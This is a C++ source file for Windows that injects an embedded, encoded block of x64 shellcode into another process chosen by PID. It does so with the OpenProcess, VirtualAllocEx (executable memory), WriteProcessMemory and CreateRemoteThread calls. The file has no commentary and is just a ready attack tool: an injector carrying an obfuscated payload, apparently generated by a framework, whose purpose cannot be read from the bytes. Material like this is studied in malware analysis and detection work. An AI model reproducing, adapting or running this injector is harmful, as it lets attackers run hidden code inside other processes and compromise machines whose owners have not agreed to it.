#include "windows.h"
#include <cstdio>

int main(int argc, char *argv[])
{
	unsigned char shellcode[] = 
        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\xb0\x5f\x9a\x5c\xb7\x4b\x14\x97\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4c\x17\x19"
        "\xb8\x47\xa3\xd4\x97\xb0\x5f\xdb\x0d\xf6\x1b\x46\xc6\xe6"
        "\x17\xab\x8e\xd2\x03\x9f\xc5\xd0\x17\x11\x0e\xaf\x03\x9f"
        "\xc5\x90\x17\x11\x2e\xe7\x03\x1b\x20\xfa\x15\xd7\x6d\x7e"
        "\x03\x25\x57\x1c\x63\xfb\x20\xb5\x67\x34\xd6\x71\x96\x97"
        "\x1d\xb6\x8a\xf6\x7a\xe2\x1e\xcb\x14\x3c\x19\x34\x1c\xf2"
        "\x63\xd2\x5d\x67\xc0\x94\x1f\xb0\x5f\x9a\x14\x32\x8b\x60"
        "\xf0\xf8\x5e\x4a\x0c\x3c\x03\x0c\xd3\x3b\x1f\xba\x15\xb6"
        "\x9b\xf7\xc1\xf8\xa0\x53\x1d\x3c\x7f\x9c\xdf\xb1\x89\xd7"
        "\x6d\x7e\x03\x25\x57\x1c\x1e\x5b\x95\xba\x0a\x15\x56\x88"
        "\xbf\xef\xad\xfb\x48\x58\xb3\xb8\x1a\xa3\x8d\xc2\x93\x4c"
        "\xd3\x3b\x1f\xbe\x15\xb6\x9b\x72\xd6\x3b\x53\xd2\x18\x3c"
        "\x0b\x08\xde\xb1\x8f\xdb\xd7\xb3\xc3\x5c\x96\x60\x1e\xc2"
        "\x1d\xef\x15\x4d\xcd\xf1\x07\xdb\x05\xf6\x11\x5c\x14\x5c"
        "\x7f\xdb\x0e\x48\xab\x4c\xd6\xe9\x05\xd2\xd7\xa5\xa2\x43"
        "\x68\x4f\xa0\xc7\x15\x09\x3c\x67\xa5\xef\x6c\xa8\x5c\xb7"
        "\x0a\x42\xde\x39\xb9\xd2\xdd\x5b\xeb\x15\x97\xb0\x16\x13"
        "\xb9\xfe\xf7\x16\x97\xa1\x03\x5a\xf4\x62\xc3\x55\xc3\xf9"
        "\xd6\x7e\x10\x3e\xba\x55\x2d\xfc\x28\xbc\x5b\x48\x9e\x58"
        "\x1e\x5a\x37\x9b\x5d\xb7\x4b\x4d\xd6\x0a\x76\x1a\x37\xb7"
        "\xb4\xc1\xc7\xe0\x12\xab\x95\xfa\x7a\xd4\xdf\x4f\x9f\xd2"
        "\xd5\x75\x03\xeb\x57\xf8\xd6\x5b\x1d\x0d\xa1\x1b\x48\x50"
        "\xa0\x4f\x14\x3e\x8c\x7e\x87\xf1\x07\xd6\xd5\x55\x03\x9d"
        "\x6e\xf1\xe5\x03\xf9\xc3\x2a\xeb\x42\xf8\xde\x5e\x1c\xb5"
        "\x4b\x14\xde\x08\x3c\xf7\x38\xb7\x4b\x14\x97\xb0\x1e\xca"
        "\x1d\xe7\x03\x9d\x75\xe7\x08\xcd\x11\x86\x8b\x7e\x9a\xe9"
        "\x1e\xca\xbe\x4b\x2d\xd3\xd3\x94\x0b\x9b\x5d\xff\xc6\x50"
        "\xb3\xa8\x99\x9a\x34\xff\xc2\xf2\xc1\xe0\x1e\xca\x1d\xe7"
        "\x0a\x44\xde\x4f\x9f\xdb\x0c\xfe\xb4\xdc\xda\x39\x9e\xd6"
        "\xd5\x76\x0a\xae\xee\x7c\x60\x1c\xa3\x62\x03\x25\x45\xf8"
        "\xa0\x50\xd7\xb9\x0a\xae\x9f\x37\x42\xfa\xa3\x62\xf0\xe4"
        "\x22\x12\x09\xdb\xe6\x11\xde\xa9\x0a\x4f\x8a\xd2\xdf\x73"
        "\x63\x28\x91\xcc\x55\x1a\xa7\x57\x3e\x11\x2c\xf7\x4c\xe8"
        "\x33\xdd\x4b\x4d\xd6\x39\x85\x65\x89\xb7\x4b\x14\x97";

	HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    printf("Injecting to PID: %i\n", atoi(argv[1]));
    
    // Adjust access rights as necessary
    processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, DWORD(atoi(argv[1])));
    
    if (processHandle == NULL) {
        printf("OpenProcess failed with error: %lu\n", GetLastError());
        return 1;
    }

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("VirtualAllocEx failed with error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL)) {
        printf("WriteProcessMemory failed with error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        printf("CreateRemoteThread failed with error: %lu\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    CloseHandle(processHandle);
    return 0;
}